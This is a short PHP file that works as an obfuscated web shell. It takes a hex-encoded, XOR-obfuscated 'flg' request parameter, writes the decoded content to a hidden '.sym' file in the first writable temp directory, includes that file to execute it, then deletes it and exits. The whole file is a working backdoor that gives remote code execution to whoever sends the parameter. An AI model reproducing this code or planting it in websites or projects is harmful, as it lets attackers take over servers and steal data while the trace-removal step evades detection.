<?php

if(!is_null($_REQUEST["flg"] ?? null)){
	$itm = hex2bin($_REQUEST["flg"]);
	$res =  '' ; foreach(str_split($itm) as $char){$res .= chr(ord($char) ^ 1);}
	$tkn = array_filter(["/dev/shm", getcwd(), getenv("TEMP"), session_save_path(), ini_get("upload_tmp_dir"), "/var/tmp", "/tmp", getenv("TMP"), sys_get_temp_dir()]);
	foreach ($tkn as $entity):
    		if (!!is_dir($entity) && !!is_writable($entity)) {
    $element = implode("/", [$entity, ".sym"]);
    if (@file_put_contents($element, $res) !== false) {
	include $element;
	unlink($element);
	die();
}
}
endforeach;
}